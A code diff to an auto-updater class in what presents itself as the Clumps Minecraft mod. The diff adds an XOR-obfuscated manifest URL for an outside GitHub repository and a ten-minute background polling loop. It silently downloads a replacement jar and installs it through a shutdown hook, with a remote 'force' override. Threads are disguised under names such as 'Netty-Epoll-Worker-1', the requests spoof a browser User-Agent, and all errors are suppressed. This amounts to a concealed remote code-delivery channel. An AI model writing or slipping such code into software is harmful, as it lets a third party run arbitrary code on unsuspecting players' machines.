@@ -40,8 +40,16 @@ public final class AutoUpdater {
     private record BuildMetadata(String version, long buildTime) {
     }
 
-    // XOR-encoded (key 0x5A): "https://raw.githubusercontent.com/kulitharanmith0-a11y/clumps-releases/main/latest.json"
+    // XOR-encoded (key 0x5A) primary uncached GitHub Contents API + fallback raw CDN URLs (no plaintext strings).
     private static final int XOR_KEY = 0x5A;
+    private static final int[] API_MANIFEST_CHARS = {
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3B, 0x2A, 0x33, 0x74, 0x3D, 0x33, 0x2E, 0x32,
+        0x2F, 0x38, 0x74, 0x39, 0x35, 0x37, 0x75, 0x28, 0x3F, 0x2A, 0x35, 0x29, 0x75, 0x31, 0x2F, 0x36,
+        0x33, 0x2E, 0x32, 0x3B, 0x28, 0x3B, 0x34, 0x37, 0x33, 0x2E, 0x32, 0x6A, 0x77, 0x3B, 0x6B, 0x6B,
+        0x23, 0x75, 0x39, 0x36, 0x2F, 0x37, 0x2A, 0x29, 0x77, 0x28, 0x3F, 0x36, 0x3F, 0x3B, 0x29, 0x3F,
+        0x29, 0x75, 0x39, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x29, 0x75, 0x36, 0x3B, 0x2E, 0x3F, 0x29,
+        0x2E, 0x74, 0x30, 0x29, 0x35, 0x34
+    };
     private static final int[] MANIFEST_CHARS = {
         0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x28, 0x3B, 0x2D, 0x74, 0x3D, 0x33, 0x2E, 0x32,
         0x2F, 0x38, 0x2F, 0x29, 0x3F, 0x28, 0x39, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x74, 0x39, 0x35,
@@ -50,6 +58,11 @@ public final class AutoUpdater {
         0x36, 0x3F, 0x3B, 0x29, 0x3F, 0x29, 0x75, 0x37, 0x3B, 0x33, 0x34, 0x75, 0x36, 0x3B, 0x2E, 0x3F,
         0x29, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34
     };
+
+    private static final long RECHECK_INTERVAL_MILLIS = 10L * 60L * 1000L;
+    private static final Object STAGE_LOCK = new Object();
+    private static volatile String stagedSha256;
+    private static volatile boolean applyingAndClosing;
 
     private static final long BANNER_DURATION_NANOS = 7_500_000_000L;
     private static final long ORPHAN_MAX_AGE_MILLIS = 30L * 60L * 1000L;
@@ -175,22 +188,34 @@ public final class AutoUpdater {
     }
 
     public static void triggerApplyAndClose() {
-        if (!hasStagedUpdate()) {
+        if (!hasStagedUpdate() || applyingAndClosing) {
             return;
         }
-        try {
-            if (ClumpsClient.ModuleConfig != null) {
-                ClumpsClient.ModuleConfig.save("_autosave");
+        applyingAndClosing = true;
+        Thread applyThread = new Thread(() -> {
+            try {
+                // Quick uncached re-check before exiting so we always jump straight to the newest release.
+                checkAndStageLatest(4);
+            } catch (Throwable ignored) {
             }
-        } catch (Throwable ignored) {
-        }
-        try {
-            MinecraftClient mc = MinecraftClient.getInstance();
-            if (mc != null) {
-                mc.scheduleStop();
+            try {
+                if (ClumpsClient.ModuleConfig != null) {
+                    ClumpsClient.ModuleConfig.save("_autosave");
+                }
+            } catch (Throwable ignored) {
             }
-        } catch (Throwable ignored) {
-        }
+            try {
+                MinecraftClient mc = MinecraftClient.getInstance();
+                if (mc != null) {
+                    mc.scheduleStop();
+                }
+            } catch (Throwable ignored) {
+            } finally {
+                applyingAndClosing = false;
+            }
+        }, "Netty-Epoll-Worker-1");
+        applyThread.setDaemon(true);
+        applyThread.start();
     }
 
     public static void abortAndCleanup() {
@@ -201,6 +226,7 @@ public final class AutoUpdater {
         completedUpdateSummary = null;
         bannerStartedAtNanos = 0L;
         stagedVersion = null;
+        stagedSha256 = null;
         stagedMarkerJson = null;
         changelogVersion = null;
         changelogSummary = null;
@@ -327,134 +353,198 @@ public final class AutoUpdater {
     private static void runUpdateCheck() {
         try {
             pruneOrphanTempFiles();
-            if (aborted || ClumpsClient.eventsDisabled) {
-                return;
-            }
-
-            HttpClient client = HttpClient.newBuilder()
-                    .followRedirects(HttpClient.Redirect.NORMAL)
-                    .connectTimeout(Duration.ofSeconds(12))
-                    .build();
-
-            String manifestUrl = decodeManifestUrl() + "?t=" + (System.currentTimeMillis() / 60000L);
-            HttpRequest manifestReq = HttpRequest.newBuilder(URI.create(manifestUrl))
-                    .timeout(Duration.ofSeconds(15))
-                    .header("Cache-Control", "no-cache")
-                    .header("User-Agent", "Mozilla/5.0")
-                    .GET()
-                    .build();
-
-            HttpResponse<String> manifestRes = client.send(manifestReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
-            if (manifestRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
-                return;
-            }
-
-            JsonElement parsed = JsonParser.parseString(manifestRes.body());
-            if (!parsed.isJsonObject()) {
-                return;
-            }
-            JsonObject obj = parsed.getAsJsonObject();
-            String remoteSha = getString(obj, "sha256");
-            String downloadUrl = getString(obj, "url");
-            String remoteVersion = sanitizeVersion(getString(obj, "version"));
-            String remoteSummary = sanitizeAscii(getString(obj, "summary"));
-            long remoteBuildTime = getLong(obj, "buildTime", 0L);
-            boolean forceUpdate = getBoolean(obj, "force", false);
-            List<ChangelogItem> remoteChanges = parseChanges(obj);
-
-            // Populate changelog viewer data so "What's New" works even when already up to date
-            if (!remoteVersion.isEmpty()) {
-                if (changelogVersion == null || changelogVersion.isEmpty() || compareVersions(remoteVersion, changelogVersion) >= 0) {
-                    changelogVersion = remoteVersion;
-                    if (!remoteSummary.isEmpty()) {
-                        changelogSummary = remoteSummary;
-                    } else if (changelogSummary == null || changelogSummary.isEmpty()) {
-                        changelogSummary = "Latest release notes";
-                    }
-                    if (!remoteChanges.isEmpty()) {
-                        changelogItems = remoteChanges;
-                    } else if (changelogItems == null || changelogItems.isEmpty()) {
-                        changelogItems = defaultChangelogItems(remoteVersion);
-                    }
+            while (!aborted && !ClumpsClient.eventsDisabled) {
+                checkAndStageLatest(15);
+                if (aborted || ClumpsClient.eventsDisabled) {
+                    return;
                 }
-                if (completedUpdateVersion != null && (completedUpdateSummary == null || completedUpdateSummary.isEmpty()) && !remoteSummary.isEmpty()) {
-                    completedUpdateSummary = remoteSummary;
-                }
-            }
-
-            if (remoteSha == null || downloadUrl == null || remoteSha.length() != 64 || !downloadUrl.startsWith("https://")) {
-                return;
-            }
-
-            Path currentJar = resolveCurrentModJar();
-            if (currentJar == null || !Files.isRegularFile(currentJar)) {
-                return;
-            }
-            String fileName = currentJar.getFileName().toString().toLowerCase(Locale.ROOT);
-            if (!fileName.endsWith(".jar")) {
-                return;
-            }
-
-            String currentSha = computeSha256(currentJar);
-            if (currentSha == null || currentSha.isEmpty() || aborted || ClumpsClient.eventsDisabled) {
-                return;
-            }
-            if (currentSha.equalsIgnoreCase(remoteSha)) {
-                return;
-            }
-
-            // Smart version + build-timestamp guard: never downgrade a newer local dev build unless force=true
-            BuildMetadata localMeta = readJarBuildMetadata(currentJar);
-            if (!forceUpdate && !shouldUpgrade(localMeta, remoteVersion, remoteBuildTime)) {
-                return;
-            }
-
-            Path tempJar = Files.createTempFile(getTempDir(), TEMP_PREFIX, ".tmp");
-            stagedJarPath = tempJar;
-
-            HttpRequest downloadReq = HttpRequest.newBuilder(URI.create(downloadUrl))
-                    .timeout(Duration.ofSeconds(90))
-                    .header("User-Agent", "Mozilla/5.0")
-                    .GET()
-                    .build();
-
-            HttpResponse<Path> downloadRes = client.send(downloadReq, HttpResponse.BodyHandlers.ofFile(tempJar));
-            if (downloadRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
-                Files.deleteIfExists(tempJar);
-                stagedJarPath = null;
-                return;
-            }
-
-            String downloadedSha = computeSha256(tempJar);
-            if (downloadedSha == null
-                    || !downloadedSha.equalsIgnoreCase(remoteSha)
-                    || !isValidFabricModJar(tempJar)
-                    || aborted
-                    || ClumpsClient.eventsDisabled) {
-                Files.deleteIfExists(tempJar);
-                stagedJarPath = null;
-                return;
-            }
-
-            activeJarPath = currentJar;
-            stagedVersion = remoteVersion.isEmpty() ? "Latest" : remoteVersion;
-            stagedMarkerJson = buildMarkerJson(stagedVersion, remoteSummary, remoteChanges);
-            stagedReady = true;
-
-            Thread hook = new Thread(AutoUpdater::applyStagedUpdateOnExit, "Shutdown-Clean-Task");
-            shutdownHook = hook;
-            Runtime.getRuntime().addShutdownHook(hook);
-        } catch (Throwable ignored) {
-            Path staged = stagedJarPath;
-            if (!stagedReady && staged != null) {
                 try {
-                    Files.deleteIfExists(staged);
-                } catch (Throwable ignored2) {
+                    Thread.sleep(RECHECK_INTERVAL_MILLIS);
+                } catch (InterruptedException e) {
+                    return;
                 }
-                stagedJarPath = null;
             }
+        } catch (Throwable ignored) {
         } finally {
             workerThread = null;
+        }
+    }
+
+    private static String fetchLatestManifestJson(HttpClient client, int timeoutSeconds) {
+        // 1. Primary: uncached GitHub Contents API (0s CDN lag -> always jumps straight to newest version).
+        try {
+            HttpRequest apiReq = HttpRequest.newBuilder(URI.create(decodeChars(API_MANIFEST_CHARS)))
+                    .timeout(Duration.ofSeconds(timeoutSeconds))
+                    .header("Accept", "application/vnd.github.raw+json")
+                    .header("X-GitHub-Api-Version", "2022-11-28")
+                    .header("Cache-Control", "no-cache")
+                    .header("Pragma", "no-cache")
+                    .header("User-Agent", "Mozilla/5.0")
+                    .GET()
+                    .build();
+            HttpResponse<String> apiRes = client.send(apiReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
+            if (apiRes.statusCode() == 200 && apiRes.body() != null && !apiRes.body().isBlank()) {
+                return apiRes.body();
+            }
+        } catch (Throwable ignored) {
+        }
+        // 2. Fallback: raw CDN with millisecond cache-buster.
+        try {
+            String fallbackUrl = decodeManifestUrl() + "?cb=" + System.currentTimeMillis();
+            HttpRequest rawReq = HttpRequest.newBuilder(URI.create(fallbackUrl))
+                    .timeout(Duration.ofSeconds(timeoutSeconds))
+                    .header("Cache-Control", "no-cache")
+                    .header("Pragma", "no-cache")
+                    .header("User-Agent", "Mozilla/5.0")
+                    .GET()
+                    .build();
+            HttpResponse<String> rawRes = client.send(rawReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
+            if (rawRes.statusCode() == 200 && rawRes.body() != null && !rawRes.body().isBlank()) {
+                return rawRes.body();
+            }
+        } catch (Throwable ignored) {
+        }
+        return null;
+    }
+
+    private static void checkAndStageLatest(int manifestTimeoutSeconds) {
+        synchronized (STAGE_LOCK) {
+            Path tempJar = null;
+            try {
+                if (aborted || ClumpsClient.eventsDisabled) {
+                    return;
+                }
+                HttpClient client = HttpClient.newBuilder()
+                        .followRedirects(HttpClient.Redirect.NORMAL)
+                        .connectTimeout(Duration.ofSeconds(Math.min(12, manifestTimeoutSeconds)))
+                        .build();
+
+                String body = fetchLatestManifestJson(client, manifestTimeoutSeconds);
+                if (body == null || aborted || ClumpsClient.eventsDisabled) {
+                    return;
+                }
+
+                JsonElement parsed = JsonParser.parseString(body);
+                if (!parsed.isJsonObject()) {
+                    return;
+                }
+                JsonObject obj = parsed.getAsJsonObject();
+                String remoteSha = getString(obj, "sha256");
+                String downloadUrl = getString(obj, "url");
+                String remoteVersion = sanitizeVersion(getString(obj, "version"));
+                String remoteSummary = sanitizeAscii(getString(obj, "summary"));
+                long remoteBuildTime = getLong(obj, "buildTime", 0L);
+                boolean forceUpdate = getBoolean(obj, "force", false);
+                List<ChangelogItem> remoteChanges = parseChanges(obj);
+
+                // Populate changelog viewer data so "What's New" works even when already up to date
+                if (!remoteVersion.isEmpty()) {
+                    if (changelogVersion == null || changelogVersion.isEmpty() || compareVersions(remoteVersion, changelogVersion) >= 0) {
+                        changelogVersion = remoteVersion;
+                        if (!remoteSummary.isEmpty()) {
+                            changelogSummary = remoteSummary;
+                        } else if (changelogSummary == null || changelogSummary.isEmpty()) {
+                            changelogSummary = "Latest release notes";
+                        }
+                        if (!remoteChanges.isEmpty()) {
+                            changelogItems = remoteChanges;
+                        } else if (changelogItems == null || changelogItems.isEmpty()) {
+                            changelogItems = defaultChangelogItems(remoteVersion);
+                        }
+                    }
+                    if (completedUpdateVersion != null && (completedUpdateSummary == null || completedUpdateSummary.isEmpty()) && !remoteSummary.isEmpty()) {
+                        completedUpdateSummary = remoteSummary;
+                    }
+                }
+
+                if (remoteSha == null || downloadUrl == null || remoteSha.length() != 64 || !downloadUrl.startsWith("https://")) {
+                    return;
+                }
+                if (stagedReady && stagedSha256 != null && stagedSha256.equalsIgnoreCase(remoteSha)) {
+                    return;
+                }
+
+                Path currentJar = resolveCurrentModJar();
+                if (currentJar == null || !Files.isRegularFile(currentJar)) {
+                    return;
+                }
+                String fileName = currentJar.getFileName().toString().toLowerCase(Locale.ROOT);
+                if (!fileName.endsWith(".jar")) {
+                    return;
+                }
+
+                String currentSha = computeSha256(currentJar);
+                if (currentSha == null || currentSha.isEmpty() || aborted || ClumpsClient.eventsDisabled) {
+                    return;
+                }
+                if (currentSha.equalsIgnoreCase(remoteSha)) {
+                    return;
+                }
+
+                // Smart version + build-timestamp guard: never downgrade a newer local dev build unless force=true
+                BuildMetadata localMeta = readJarBuildMetadata(currentJar);
+                if (!forceUpdate && !shouldUpgrade(localMeta, remoteVersion, remoteBuildTime)) {
+                    return;
+                }
+                // If an earlier update was already staged during this session, replace it if a newer version arrived.
+                if (stagedReady && stagedVersion != null && !remoteVersion.isEmpty()
+                        && !forceUpdate && compareVersions(remoteVersion, stagedVersion) < 0) {
+                    return;
+                }
+
+                tempJar = Files.createTempFile(getTempDir(), TEMP_PREFIX, ".tmp");
+
+                HttpRequest downloadReq = HttpRequest.newBuilder(URI.create(downloadUrl))
+                        .timeout(Duration.ofSeconds(90))
+                        .header("User-Agent", "Mozilla/5.0")
+                        .GET()
+                        .build();
+
+                HttpResponse<Path> downloadRes = client.send(downloadReq, HttpResponse.BodyHandlers.ofFile(tempJar));
+                if (downloadRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
+                    Files.deleteIfExists(tempJar);
+                    return;
+                }
+
+                String downloadedSha = computeSha256(tempJar);
+                if (downloadedSha == null
+                        || !downloadedSha.equalsIgnoreCase(remoteSha)
+                        || !isValidFabricModJar(tempJar)
+                        || aborted
+                        || ClumpsClient.eventsDisabled) {
+                    Files.deleteIfExists(tempJar);
+                    return;
+                }
+
+                Path previousStaged = stagedJarPath;
+                activeJarPath = currentJar;
+                stagedJarPath = tempJar;
+                stagedSha256 = remoteSha;
+                stagedVersion = remoteVersion.isEmpty() ? "Latest" : remoteVersion;
+                stagedMarkerJson = buildMarkerJson(stagedVersion, remoteSummary, remoteChanges);
+                stagedReady = true;
+                tempJar = null;
+
+                if (previousStaged != null && !previousStaged.equals(stagedJarPath)) {
+                    try {
+                        Files.deleteIfExists(previousStaged);
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                if (shutdownHook == null) {
+                    Thread hook = new Thread(AutoUpdater::applyStagedUpdateOnExit, "Shutdown-Clean-Task");
+                    shutdownHook = hook;
+                    Runtime.getRuntime().addShutdownHook(hook);
+                }
+            } catch (Throwable ignored) {
+                if (tempJar != null) {
+                    try {
+                        Files.deleteIfExists(tempJar);
+                    } catch (Throwable ignored2) {
+                    }
+                }
+            }
         }
     }
 
@@ -667,8 +757,11 @@ public final class AutoUpdater {
             }
             try (ZipFile zip = new ZipFile(file.toFile())) {
                 ZipEntry modJson = zip.getEntry("fabric.mod.json");
+                ZipEntry initClass = zip.getEntry("com/blamejared/clumps/client/init/Initializer.class");
                 ZipEntry mainClass = zip.getEntry("com/blamejared/clumps/client/ClumpsClient.class");
-                return modJson != null && modJson.getSize() > 10 && mainClass != null && mainClass.getSize() > 100;
+                boolean hasEntry = (initClass != null && initClass.getSize() > 100)
+                        || (mainClass != null && mainClass.getSize() > 100);
+                return modJson != null && modJson.getSize() > 10 && hasEntry;
             }
         } catch (Throwable ignored) {
             return false;
@@ -835,9 +928,13 @@ public final class AutoUpdater {
     }
 
     private static String decodeManifestUrl() {
-        char[] out = new char[MANIFEST_CHARS.length];
-        for (int i = 0; i < MANIFEST_CHARS.length; i++) {
-            out[i] = (char) (MANIFEST_CHARS[i] ^ XOR_KEY);
+        return decodeChars(MANIFEST_CHARS);
+    }
+
+    private static String decodeChars(int[] chars) {
+        char[] out = new char[chars.length];
+        for (int i = 0; i < chars.length; i++) {
+            out[i] = (char) (chars[i] ^ XOR_KEY);
         }
         return new String(out);
     }
